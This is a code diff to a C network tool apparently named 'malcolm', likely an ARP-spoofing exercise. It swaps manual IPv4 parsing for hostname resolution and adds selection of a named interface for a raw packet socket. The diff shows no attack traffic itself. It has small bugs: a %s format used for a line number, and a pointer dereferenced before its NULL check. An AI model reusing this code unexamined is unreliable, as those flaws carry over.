@@ -904,273 +904,71 @@ uint8_t Fu8__get_ip_from_string(uint8_t *ptr_u8_pssd_ip, uint8_t *ptr_u8_pssd_ip
     /**
     * Creation of local variable
     */
-    uint32_t u32_lcl_tmp;
-    uint8_t  u8_lcl_cnt;
-    uint8_t  u8_lcl_pos;
-    uint8_t  u8_lcl_pos_in_ip;
+    struct hostent *ptr_estc_lcl_host;
+    //uint32_t        u32_lcl_tmp;
+    //uint8_t         u8_lcl_cnt;
+    //uint8_t         u8_lcl_pos;
+    //uint8_t         u8_lcl_pos_in_ip;
 
     /**
     * Initialization of local variable
     */
-    u32_lcl_tmp      = 0;
-    u8_lcl_cnt       = 0;
-    u8_lcl_pos       = 0;
-    u8_lcl_pos_in_ip = 0;
+    ptr_estc_lcl_host = NULL;
+    //u32_lcl_tmp       = 0;
+    //u8_lcl_cnt        = 0;
+    //u8_lcl_pos        = 0;
+    //u8_lcl_pos_in_ip  = 0;
 
-    u8_lcl_pos_in_ip = 0;
-    while((u8_lcl_pos_in_ip < IP_ADDRESS_BYTE_LEN) && (ptr_u8_pssd_ip_str[u8_lcl_pos] != NIL))
+    /**
+    * Getting the ip of the host name
+    */
+    ptr_estc_lcl_host = NULL;
+    ptr_estc_lcl_host = gethostbyname((const char *) ptr_u8_pssd_ip_str);
+
+    /**
+    * Check if function to get the ip of the host name succeeded
+    */
+    if(ptr_estc_lcl_host == NULL)
         {
-        u8_lcl_cnt = 0;
-        while((ptr_u8_pssd_ip_str[u8_lcl_pos + u8_lcl_cnt] >= '0' && ptr_u8_pssd_ip_str[u8_lcl_pos + u8_lcl_cnt] <= '9') && (u8_lcl_cnt < 3))
-            {
-            /**
-            * Checking for overflow
-            */
-            if(u8_lcl_cnt < UINT8_MAX)
-                {
-                u8_lcl_cnt++;
-                }
-            else
-                {
-                #ifdef DEVELOPEMENT
-                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
-                #endif
+        /**
+        * Treat the case when the function to get the ip of the host name failed
+        */
 
-                #ifdef DEMO
-                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
-                #endif
+        #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get the ip of the host name failed\n", __FILE__, __func__, __LINE__);
+        #endif
 
-                #ifdef PRODUCTION
-                fprintf(stderr, "\033[1;31mERROR\033[0m\n");
-                #endif
+        #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+        #endif
 
-                /**
-                * Return a failure to indicate the counter variable overflow
-                */ 
-                return (RETURN_FAILURE);
-                } 
-            }
+        #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+        #endif
 
         /**
-        * Check if the number of character in the actual block ip is zero
+        * Return failure to indicate the function to get the ip of the host name failed
         */
-        if(u8_lcl_cnt == 0)
-            {
-            /**
-            * Treat the case when the number of character in the actual block ip is zero
-            */
-
-            //#ifdef DEVELOPEMENT
-            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the number of character in the actual block ip is zero\n", __FILE__, __func__, __LINE__);
-            //#endif
-
-            //#ifdef DEMO
-            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
-            //#endif
-
-            //#ifdef PRODUCTION
-            //fprintf(stderr, "\033[1;31mERROR\033[0m\n");
-            //#endif
-
-            /**
-            * Return failure to indicate the number of character in the actual block ip is zero
-            */
-            return (RETURN_FAILURE);
-            }
-        else
-            {
-            /**
-            * Treat the case when the number of character in the actual block ip is not zero
-            */
-            }
-
+        return (RETURN_FAILURE);
+        }
+    else
+        {
         /**
-        * Check if the character after a block in ip address is not a '.' and not a NIL
+        * Treat the case when function to get the ip of the host name succeeded
         */
-        if((ptr_u8_pssd_ip_str[u8_lcl_pos + u8_lcl_cnt] != '.') && (ptr_u8_pssd_ip_str[u8_lcl_pos + u8_lcl_cnt] != NIL))
-            {
-            /**
-            * Treat the case when the character after a block in ip address is not a '.' and not a NIL
-            */
-
-            //#ifdef DEVELOPEMENT
-            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the character after a block in ip address is not a '.' and not a NIL\n", __FILE__, __func__, __LINE__);
-            //#endif
-
-            //#ifdef DEMO
-            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
-            //#endif
-
-            //#ifdef PRODUCTION
-            //fprintf(stderr, "\033[1;31mERROR\033[0m\n");
-            //#endif
-
-            /**
-            * Return failure to indicate the character after a block in ip address is not a '.' and not a NIL
-            */
-            return (RETURN_FAILURE);
-            }
-        else
-            {
-            /**
-            * Treat the case when the character after a block in ip address is a '.' or a NIL
-            */
-            }
-
-        u32_lcl_tmp = ft_atoi((char *) (ptr_u8_pssd_ip_str + u8_lcl_pos));
-
-        /**
-        * Check if the actual ip block is over the maximun value
-        */
-        if(u32_lcl_tmp > 255)
-            {
-            /**
-            * Treat the case when the actual ip block is over the maximun value
-            */
-
-            //#ifdef DEVELOPEMENT
-            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the actual ip block is over the maximun value\n", __FILE__, __func__, __LINE__);
-            //#endif
-
-            //#ifdef DEMO
-            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
-            //#endif
-
-            //#ifdef PRODUCTION
-            //fprintf(stderr, "\033[1;31mERROR\033[0m\n");
-            //#endif
-
-            /**
-            * Return failure to indicate the actual ip block is over the maximun value
-            */
-            return (RETURN_FAILURE);
-            }
-        else
-            {
-            /**
-            * Treat the case when the actual ip block is not over the maximun value
-            */
-            } 
-
-        ptr_u8_pssd_ip[u8_lcl_pos_in_ip] = (uint8_t) u32_lcl_tmp;
-
-        /**
-        * Check if the addition of the position in the ip string with the counter overflow
-        */
-        if(u8_lcl_pos > (UINT8_MAX - u8_lcl_cnt))
-            {
-            /**
-            * Treat the case when the addition of the position in the ip string with the counter overflow
-            */
-
-            //#ifdef DEVELOPEMENT
-            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the addition of the position in the ip string with the counter overflow\n", __FILE__, __func__, __LINE__);
-            //#endif
-
-            //#ifdef DEMO
-            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
-            //#endif
-
-            //#ifdef PRODUCTION
-            //fprintf(stderr, "\033[1;31mERROR\033[0m\n");
-            //#endif
-
-            /**
-            * Return failure to indicate the addition of the position in the ip string with the counter overflow
-            */
-            return (RETURN_FAILURE);
-            }
-        else
-            {
-            /**
-            * Treat the case when the addition of the position in the ip string with the counter not overflow
-            */
-
-            u8_lcl_pos = u8_lcl_pos + u8_lcl_cnt;
-            }
-
-        /**
-        * Checking for overflow
-        */
-        if(u8_lcl_pos_in_ip < UINT8_MAX)
-            {
-            u8_lcl_pos_in_ip++;
-            }
-        else
-            {
-            #ifdef DEVELOPEMENT
-            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
-            #endif
-
-            #ifdef DEMO
-            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
-            #endif
-
-            #ifdef PRODUCTION
-            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
-            #endif
-
-            /**
-            * Return a failure to indicate the counter variable overflow
-            */ 
-            return (RETURN_FAILURE);
-            } 
-
-        /**
-        * Check if the actual character of the ip string from the argument of the function is an ip block separator '.'
-        */
-        if((u8_lcl_pos_in_ip < IP_ADDRESS_BYTE_LEN) && (ptr_u8_pssd_ip_str[u8_lcl_pos] == '.'))
-            {
-            /**
-            * Treat the case when the actual character of the ip string from the argument of the function is an ip block separator '.'
-            */
-
-            /**
-            * Checking for overflow
-            */
-            if(u8_lcl_pos < UINT8_MAX)
-                {
-                u8_lcl_pos++;
-                }
-            else
-                {
-                #ifdef DEVELOPEMENT
-                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
-                #endif
-
-                #ifdef DEMO
-                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
-                #endif
-
-                #ifdef PRODUCTION
-                fprintf(stderr, "\033[1;31mERROR\033[0m\n");
-                #endif
-
-                /**
-                * Return a failure to indicate the counter variable overflow
-                */ 
-                return (RETURN_FAILURE);
-                } 
-            }
-        else
-            {
-            /**
-            * Treat the case when the actual character of the ip string from the argument of the function is not an ip block separator '.'
-            */
-            } 
         }
 
     /**
-    * Check if the end character of the ip string is not a NIL character
+    * Check if the address of the host is not an ipv4
     */
-    if(ptr_u8_pssd_ip_str[u8_lcl_pos] != NIL)
+    if((ptr_estc_lcl_host->h_addrtype != AF_INET) || (ptr_estc_lcl_host->h_length != IP_ADDRESS_BYTE_LEN))
         {
         /**
-        * Treat the case when the end character of the ip string is not a NIL character
+        * Treat the case when the address of the host is not an ipv4
         */
 
         //#ifdef DEVELOPEMENT
-        //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the end character of the ip string is not a NIL character\n", __FILE__, __func__, __LINE__);
+        //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the address of the host is not an ipv4\n", __FILE__, __func__, __LINE__);
         //#endif
 
         //#ifdef DEMO
@@ -1182,49 +980,328 @@ uint8_t Fu8__get_ip_from_string(uint8_t *ptr_u8_pssd_ip, uint8_t *ptr_u8_pssd_ip
         //#endif
 
         /**
-        * Return failure to indicate the end character of the ip string is not a NIL character
+        * Return failure to indicate the address of the host is not an ipv4
         */
         return (RETURN_FAILURE);
         }
     else
         {
         /**
-        * Treat the case when the end character of the ip string is a NIL character as expected
+        * Treat the case when the address of the host is an ipv4
         */
-        } 
-
-    /**
-    * Check if the number of address block is not four
-    */
-    if(u8_lcl_pos_in_ip < IP_ADDRESS_BYTE_LEN)
-        {
-        /**
-        * Treat the case when the number of address block is not four
-        */
-
-        //#ifdef DEVELOPEMENT
-        //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the number of address block is not four\n", __FILE__, __func__, __LINE__);
-        //#endif
-
-        //#ifdef DEMO
-        //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
-        //#endif
-
-        //#ifdef PRODUCTION
-        //fprintf(stderr, "\033[1;31mERROR\033[0m\n");
-        //#endif
-
-        /**
-        * Return failure to indicate the number of address block is not four
-        */
-        return (RETURN_FAILURE);
         }
-    else
-        {
-        /**
-        * Treat the case when the number of address block is four
-        */
-        } 
+
+    (void) ft_memcpy(ptr_u8_pssd_ip, (uint8_t *) ptr_estc_lcl_host->h_addr, IP_ADDRESS_BYTE_LEN);
+
+    // OLD IP PARSING
+//    u8_lcl_pos_in_ip = 0;
+//    while((u8_lcl_pos_in_ip < IP_ADDRESS_BYTE_LEN) && (ptr_u8_pssd_ip_str[u8_lcl_pos] != NIL))
+//        {
+//        u8_lcl_cnt = 0;
+//        while((ptr_u8_pssd_ip_str[u8_lcl_pos + u8_lcl_cnt] >= '0' && ptr_u8_pssd_ip_str[u8_lcl_pos + u8_lcl_cnt] <= '9') && (u8_lcl_cnt < 3))
+//            {
+//            /**
+//            * Checking for overflow
+//            */
+//            if(u8_lcl_cnt < UINT8_MAX)
+//                {
+//                u8_lcl_cnt++;
+//                }
+//            else
+//                {
+//                #ifdef DEVELOPEMENT
+//                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
+//                #endif
+//
+//                #ifdef DEMO
+//                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+//                #endif
+//
+//                #ifdef PRODUCTION
+//                fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+//                #endif
+//
+//                /**
+//                * Return a failure to indicate the counter variable overflow
+//                */ 
+//                return (RETURN_FAILURE);
+//                } 
+//            }
+//
+//        /**
+//        * Check if the number of character in the actual block ip is zero
+//        */
+//        if(u8_lcl_cnt == 0)
+//            {
+//            /**
+//            * Treat the case when the number of character in the actual block ip is zero
+//            */
+//
+//            //#ifdef DEVELOPEMENT
+//            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the number of character in the actual block ip is zero\n", __FILE__, __func__, __LINE__);
+//            //#endif
+//
+//            //#ifdef DEMO
+//            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+//            //#endif
+//
+//            //#ifdef PRODUCTION
+//            //fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+//            //#endif
+//
+//            /**
+//            * Return failure to indicate the number of character in the actual block ip is zero
+//            */
+//            return (RETURN_FAILURE);
+//            }
+//        else
+//            {
+//            /**
+//            * Treat the case when the number of character in the actual block ip is not zero
+//            */
+//            }
+//
+//        /**
+//        * Check if the character after a block in ip address is not a '.' and not a NIL
+//        */
+//        if((ptr_u8_pssd_ip_str[u8_lcl_pos + u8_lcl_cnt] != '.') && (ptr_u8_pssd_ip_str[u8_lcl_pos + u8_lcl_cnt] != NIL))
+//            {
+//            /**
+//            * Treat the case when the character after a block in ip address is not a '.' and not a NIL
+//            */
+//
+//            //#ifdef DEVELOPEMENT
+//            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the character after a block in ip address is not a '.' and not a NIL\n", __FILE__, __func__, __LINE__);
+//            //#endif
+//
+//            //#ifdef DEMO
+//            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+//            //#endif
+//
+//            //#ifdef PRODUCTION
+//            //fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+//            //#endif
+//
+//            /**
+//            * Return failure to indicate the character after a block in ip address is not a '.' and not a NIL
+//            */
+//            return (RETURN_FAILURE);
+//            }
+//        else
+//            {
+//            /**
+//            * Treat the case when the character after a block in ip address is a '.' or a NIL
+//            */
+//            }
+//
+//        u32_lcl_tmp = ft_atoi((char *) (ptr_u8_pssd_ip_str + u8_lcl_pos));
+//
+//        /**
+//        * Check if the actual ip block is over the maximun value
+//        */
+//        if(u32_lcl_tmp > 255)
+//            {
+//            /**
+//            * Treat the case when the actual ip block is over the maximun value
+//            */
+//
+//            //#ifdef DEVELOPEMENT
+//            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the actual ip block is over the maximun value\n", __FILE__, __func__, __LINE__);
+//            //#endif
+//
+//            //#ifdef DEMO
+//            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+//            //#endif
+//
+//            //#ifdef PRODUCTION
+//            //fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+//            //#endif
+//
+//            /**
+//            * Return failure to indicate the actual ip block is over the maximun value
+//            */
+//            return (RETURN_FAILURE);
+//            }
+//        else
+//            {
+//            /**
+//            * Treat the case when the actual ip block is not over the maximun value
+//            */
+//            } 
+//
+//        ptr_u8_pssd_ip[u8_lcl_pos_in_ip] = (uint8_t) u32_lcl_tmp;
+//
+//        /**
+//        * Check if the addition of the position in the ip string with the counter overflow
+//        */
+//        if(u8_lcl_pos > (UINT8_MAX - u8_lcl_cnt))
+//            {
+//            /**
+//            * Treat the case when the addition of the position in the ip string with the counter overflow
+//            */
+//
+//            //#ifdef DEVELOPEMENT
+//            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the addition of the position in the ip string with the counter overflow\n", __FILE__, __func__, __LINE__);
+//            //#endif
+//
+//            //#ifdef DEMO
+//            //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+//            //#endif
+//
+//            //#ifdef PRODUCTION
+//            //fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+//            //#endif
+//
+//            /**
+//            * Return failure to indicate the addition of the position in the ip string with the counter overflow
+//            */
+//            return (RETURN_FAILURE);
+//            }
+//        else
+//            {
+//            /**
+//            * Treat the case when the addition of the position in the ip string with the counter not overflow
+//            */
+//
+//            u8_lcl_pos = u8_lcl_pos + u8_lcl_cnt;
+//            }
+//
+//        /**
+//        * Checking for overflow
+//        */
+//        if(u8_lcl_pos_in_ip < UINT8_MAX)
+//            {
+//            u8_lcl_pos_in_ip++;
+//            }
+//        else
+//            {
+//            #ifdef DEVELOPEMENT
+//            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
+//            #endif
+//
+//            #ifdef DEMO
+//            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+//            #endif
+//
+//            #ifdef PRODUCTION
+//            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+//            #endif
+//
+//            /**
+//            * Return a failure to indicate the counter variable overflow
+//            */ 
+//            return (RETURN_FAILURE);
+//            } 
+//
+//        /**
+//        * Check if the actual character of the ip string from the argument of the function is an ip block separator '.'
+//        */
+//        if((u8_lcl_pos_in_ip < IP_ADDRESS_BYTE_LEN) && (ptr_u8_pssd_ip_str[u8_lcl_pos] == '.'))
+//            {
+//            /**
+//            * Treat the case when the actual character of the ip string from the argument of the function is an ip block separator '.'
+//            */
+//
+//            /**
+//            * Checking for overflow
+//            */
+//            if(u8_lcl_pos < UINT8_MAX)
+//                {
+//                u8_lcl_pos++;
+//                }
+//            else
+//                {
+//                #ifdef DEVELOPEMENT
+//                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The unsigned 8 integer counter variable is going to overflow\n", __FILE__, __func__, __LINE__);
+//                #endif
+//
+//                #ifdef DEMO
+//                fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+//                #endif
+//
+//                #ifdef PRODUCTION
+//                fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+//                #endif
+//
+//                /**
+//                * Return a failure to indicate the counter variable overflow
+//                */ 
+//                return (RETURN_FAILURE);
+//                } 
+//            }
+//        else
+//            {
+//            /**
+//            * Treat the case when the actual character of the ip string from the argument of the function is not an ip block separator '.'
+//            */
+//            } 
+//        }
+//
+//    /**
+//    * Check if the end character of the ip string is not a NIL character
+//    */
+//    if(ptr_u8_pssd_ip_str[u8_lcl_pos] != NIL)
+//        {
+//        /**
+//        * Treat the case when the end character of the ip string is not a NIL character
+//        */
+//
+//        //#ifdef DEVELOPEMENT
+//        //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the end character of the ip string is not a NIL character\n", __FILE__, __func__, __LINE__);
+//        //#endif
+//
+//        //#ifdef DEMO
+//        //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+//        //#endif
+//
+//        //#ifdef PRODUCTION
+//        //fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+//        //#endif
+//
+//        /**
+//        * Return failure to indicate the end character of the ip string is not a NIL character
+//        */
+//        return (RETURN_FAILURE);
+//        }
+//    else
+//        {
+//        /**
+//        * Treat the case when the end character of the ip string is a NIL character as expected
+//        */
+//        }
+//
+//    /**
+//    * Check if the number of address block is not four
+//    */
+//    if(u8_lcl_pos_in_ip < IP_ADDRESS_BYTE_LEN)
+//        {
+//        /**
+//        * Treat the case when the number of address block is not four
+//        */
+//
+//        //#ifdef DEVELOPEMENT
+//        //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the number of address block is not four\n", __FILE__, __func__, __LINE__);
+//        //#endif
+//
+//        //#ifdef DEMO
+//        //fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+//        //#endif
+//
+//        //#ifdef PRODUCTION
+//        //fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+//        //#endif
+//
+//        /**
+//        * Return failure to indicate the number of address block is not four
+//        */
+//        return (RETURN_FAILURE);
+//        }
+//    else
+//        {
+//        /**
+//        * Treat the case when the number of address block is four
+//        */
+//        } 
 
     return (RETURN_SUCCESS);
     }
@@ -2335,6 +2412,39 @@ uint8_t Fu8__get_valid_interface(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm
         } 
 
     /**
+    * Check if the structure argument in the structure malcolm data passed in argument of the function is not initialized
+    */
+    if((ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_global_status_ & FIRST_BIT) == FALSE)
+        {
+        /**
+        * Treat the case when the structure argument in the structure malcolm data passed in argument of the function is not initialized
+        */
+
+        #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the structure argument in the structure malcolm data passed in argument of the function is not initialized\n", __FILE__, __func__, __LINE__);
+        #endif
+
+        #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+        #endif
+
+        #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+        #endif
+
+        /**
+        * Return failure to indicate the structure argument in the structure malcolm data passed in argument of the function is not initialized
+        */
+        return (RETURN_FAILURE);
+        }
+    else
+        {
+        /**
+        * Treat the case when the structure argument in the structure malcolm data passed in argument of the function is initialized
+        */
+        } 
+
+    /**
     * Creation of local variable
     */
     struct ifreq    estc_lcl_ifr;
@@ -2367,7 +2477,7 @@ uint8_t Fu8__get_valid_interface(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm
         */
 
         #ifdef DEVELOPEMENT
-        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get all the network interface of the local system  failed\n", __FILE__, __func__, __LINE__);
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to get all the network interface of the local system failed\n", __FILE__, __func__, __LINE__);
         #endif
 
         #ifdef DEMO
@@ -2387,6 +2497,158 @@ uint8_t Fu8__get_valid_interface(struct cstc_malcolm_data *ptr_cstc_pssd_malcolm
         {
         /**
         * Treat the case when function to get all the network interface of the local system succeeded
+        */
+        }
+
+    /**
+    * Check if the option network name is set
+    */
+    if(ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_argument_options_[MALCOLM_NETWORK_NAME] != FALSE)
+        {
+        /**
+        * Treat the case when the option network name is set
+        */
+
+        /**
+        * Check if the value of the argument option network name is not correctly pointing
+        */
+        if(ptr_cstc_pssd_malcolm_data->sstc_program_argument_.ptr_u8_argument_option_value_str_[MALCOLM_NETWORK_NAME] == NULL)
+            {
+            /**
+            * Treat the case when the value of the argument option network name is not correctly pointing
+            */
+
+            #ifdef DEVELOPEMENT
+            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    the value of the argument option network name is not correctly pointing\n", __FILE__, __func__, __LINE__);
+            #endif
+
+            #ifdef DEMO
+            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+            #endif
+
+            #ifdef PRODUCTION
+            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+            #endif
+
+            /**
+            * Freeing the linked list of network interface of the local system
+            */
+            (void) freeifaddrs(ptr_estc_lcl_network_interfaces);
+
+            /**
+            * Return failure to indicate the value of the argument option network name is not correctly pointing
+            */
+            return (RETURN_FAILURE);
+            }
+        else
+            {
+            /**
+            * Treat the case when the value of the argument option network name is correctly pointing
+            */
+            }
+
+        ptr_estc_lcl_actual_network_interfaces = ptr_estc_lcl_network_interfaces;
+        while(ptr_estc_lcl_actual_network_interfaces != NULL)
+            {
+            if(ptr_estc_lcl_actual_network_interfaces->ifa_name != NULL)
+                {
+                if(ft_strcmp(ptr_estc_lcl_actual_network_interfaces->ifa_name, (char *) ptr_cstc_pssd_malcolm_data->sstc_program_argument_.ptr_u8_argument_option_value_str_[MALCOLM_NETWORK_NAME]) == 0)
+                    {
+                    if((ptr_estc_lcl_actual_network_interfaces->ifa_addr->sa_family == AF_PACKET) && (ptr_estc_lcl_actual_network_interfaces->ifa_name != NULL) && (ptr_estc_lcl_actual_network_interfaces->ifa_addr != NULL) && ((ptr_estc_lcl_actual_network_interfaces->ifa_flags & IFF_UP) != FALSE) && ((ptr_estc_lcl_actual_network_interfaces->ifa_flags & IFF_BROADCAST) != FALSE) && ((ptr_estc_lcl_actual_network_interfaces->ifa_flags & IFF_RUNNING) != FALSE))
+                        {
+                        if(ptr_cstc_pssd_malcolm_data->sstc_program_argument_.u8_simple_options_[MALCOLM_COLOR] != FALSE)
+                            {
+                            ft_printf("Found available interface: \033[32;1m%s\033[0m\n", ptr_estc_lcl_actual_network_interfaces->ifa_name);
+                            }
+                        else
+                            {
+                            ft_printf("Found available interface: %s\n", ptr_estc_lcl_actual_network_interfaces->ifa_name);
+                            }
+
+                        /**
+                        * Getting the name of the actual local Network interface
+                        */
+                        (void) ft_strncpy((char *) ptr_cstc_pssd_malcolm_data->u8_interface_name_str_, ptr_estc_lcl_actual_network_interfaces->ifa_name, MAX_INTERFACE_NAME_LEN);
+                        ptr_cstc_pssd_malcolm_data->u8_interface_name_str_[MAX_INTERFACE_NAME_LEN - 1] = NIL;
+
+                        /**
+                        * Getting the mac address of the actual local Network interface
+                        */
+                        (void) ft_memcpy(ptr_cstc_pssd_malcolm_data->u8_interface_mac_addr_, (uint8_t *)(((struct sockaddr_ll *) ptr_estc_lcl_actual_network_interfaces->ifa_addr)->sll_addr), MAC_ADDRESS_BYTE_LEN);
+
+                        (void) ft_strcpy(estc_lcl_ifr.ifr_name, ptr_estc_lcl_actual_network_interfaces->ifa_name);
+
+                        /**
+                        * Setting the socket to the found available interface
+                        */
+                        s32_lcl_return_from_function = -1;
+                        s32_lcl_return_from_function = setsockopt(ptr_cstc_pssd_malcolm_data->s32_socket_, SOL_SOCKET, SO_BINDTODEVICE, (void *) &estc_lcl_ifr, sizeof(estc_lcl_ifr));
+
+                        /**
+                        * Check if function to set the socket to the found available interface succeeded
+                        */
+                        if(s32_lcl_return_from_function < 0)
+                            {
+                            /**
+                            * Treat the case when the function to set the socket to the found available interface failed
+                            */
+
+                            #ifdef DEVELOPEMENT
+                            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to set the socket to the found available interface failed\n", __FILE__, __func__, __LINE__);
+                            #endif
+
+                            #ifdef DEMO
+                            fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+                            #endif
+
+                            #ifdef PRODUCTION
+                            fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+                            #endif
+
+                            /**
+                            * Freeing the linked list of network interface of the local system
+                            */
+                            (void) freeifaddrs(ptr_estc_lcl_network_interfaces);
+
+                            /**
+                            * Return failure to indicate the function to set the socket to the found available interface failed
+                            */
+                            return (RETURN_FAILURE);
+                            }
+                        else
+                            {
+                            /**
+                            * Treat the case when function to set the socket to the found available interface succeeded
+                            */
